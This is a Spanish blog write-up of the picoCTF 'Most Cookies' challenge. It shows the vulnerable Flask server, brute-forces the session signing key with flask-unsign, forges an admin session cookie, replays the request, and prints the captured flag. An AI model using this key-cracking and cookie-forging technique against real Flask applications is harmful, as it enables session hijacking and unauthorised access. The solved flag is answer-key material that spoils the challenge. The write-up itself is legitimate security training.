---
title: Most Cookies
date: 2025-07-23 11:00:00 +0200
categories: [writeup, picoctf]
tags: [picoctf, explotación web, flask, cookies]     
image:
    path: https://picoctf.org/img/logos/pico-mark.svg
    alt: PicoCTF
---
>Most Cookies
Author: madStacks
Description
Alright, enough of using my own encryption. Flask session cookies should be plenty secure! server.py http://mercury.picoctf.net:65344/
{: .prompt-tip }

Nos ofrece descargar server.py, haciendo un primer análisis
``` python 
from flask import Flask, render_template, request, url_for, redirect, make_response, flash, session
import random
app = Flask(__name__)
flag_value = open("./flag").read().rstrip()
title = "Most Cookies"
cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]
app.secret_key = random.choice(cookie_names)

@app.route("/")
def main():
	if session.get("very_auth"):
		check = session["very_auth"]
		if check == "blank":
			return render_template("index.html", title=title)
		else:
			return make_response(redirect("/display"))
	else:
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp

@app.route("/search", methods=["GET", "POST"])
def search():
	if "name" in request.form and request.form["name"] in cookie_names:
		resp = make_response(redirect("/display"))
		session["very_auth"] = request.form["name"]
		return resp
	else:
		message = "That doesn't appear to be a valid cookie."
		category = "danger"
		flash(message, category)
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp

@app.route("/reset")
def reset():
	resp = make_response(redirect("/"))
	session.pop("very_auth", None)
	return resp

@app.route("/display", methods=["GET"])
def flag():
	if session.get("very_auth"):
		check = session["very_auth"]
		if check == "admin":
			resp = make_response(render_template("flag.html", value=flag_value, title=title))
			return resp
		flash("That is a cookie! Not very special though...", "success")
		return render_template("not-flag.html", title=title, cookie_name=session["very_auth"])
	else:
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp

if __name__ == "__main__":
	app.run()
```
En el navegador aparece esta cookie de sesión. Procedo con su análisis

>session=eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.aIDITg.D5BnzBwxyZNqDjS6aHvFs8TnHmM
``` shell
pablo☠office Most-Cookies$ echo "eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.aIDITg.D5BnzBwxyZNqDjS6aHvFs8TnHmM" | base64 -d
{"very_auth":"blank"}base64: entrada inválida
```

Para hacer fuerza bruta contra estas claves de flask me valgo de este proyecto [https://github.com/Paradoxis/Flask-Unsign](https://github.com/Paradoxis/Flask-Unsign), así que procedo a descargarlo e instalarlo con pip

``` shell
mkdir ~/pentest/flask-unsign
cd ~/pentest/flask-unsign
python -m venv .
source bin/activate
pip install flask-unsign
```

Ahora que lo tenemos instalado podemos comenzar con la fuerza bruta contra la cookie

``` shell
(flask-unsign) pablo☠office flask-unsign$ flask-unsign -u --cookie "eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.aIDITg.D5BnzBwxyZNqDjS6aHvFs8TnHmM" -w ~/pentest/wordlist/rockyou.txt --no-literal-eval
[*] Session decodes to: {'very_auth': 'blank'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 6630912 attempts
b'fortune'
```
Ok la clave parece "fortune" y ahora que tenemos la clave si analizamos el código del servidor podemos deducir para ver la clave necesitamos ser admin y por lo tanto **'very_auth': 'admin'** debe ser el payload de la cookie, claro que habrá q firmarlo previamente para que el servidor lo acepte.

``` shell
(flask-unsign) pablo☠office flask-unsign$ flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret 'fortune'
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.aIDZtg.cMcK_FzsfI2_xdHK1gcVbZQg2mU
```

Capturo el request con Zap proxy y altero la cookie 
``` html
GET http://mercury.picoctf.net:65344/display HTTP/1.1
host: mercury.picoctf.net:65344
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Connection: keep-alive
Cookie: session=eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.aIDZtg.cMcK_FzsfI2_xdHK1gcVbZQg2mU
Upgrade-Insecure-Requests: 1
Priority: u=0, i
content-length: 0
```
Respuesta
``` html
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 1194
Vary: Cookie

<!DOCTYPE html>
<html lang="en">

<head>
    <title>Most Cookies</title>


    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css" rel="stylesheet">

    <link href="https://getbootstrap.com/docs/3.3/examples/jumbotron-narrow/jumbotron-narrow.css" rel="stylesheet">

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>

</head>

<body>

    <div class="container">
        <div class="header">
            <nav>
                <ul class="nav nav-pills pull-right">
                    <li role="presentation"><a href="/reset" class="btn btn-link pull-right">Reset</a>
                    </li>
                </ul>
            </nav>
            <h3 class="text-muted">Most Cookies</h3>
        </div>

        <div class="jumbotron">
            <p class="lead"></p>
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{pwn_4ll_th3_cook1E5_25bdb6f6}</code></p>
        </div>


        <footer class="footer">
            <p>&copy; PicoCTF</p>
        </footer>

    </div>
</body>

</html>
```
flag: **picoCTF{pwn_4ll_th3_cook1E5_25bdb6f6}**

Interesante reto muy parecido a [Java Code Analysis!?!](../picoctf-java-code-analisis!-!) pero esta vez versión Flask. 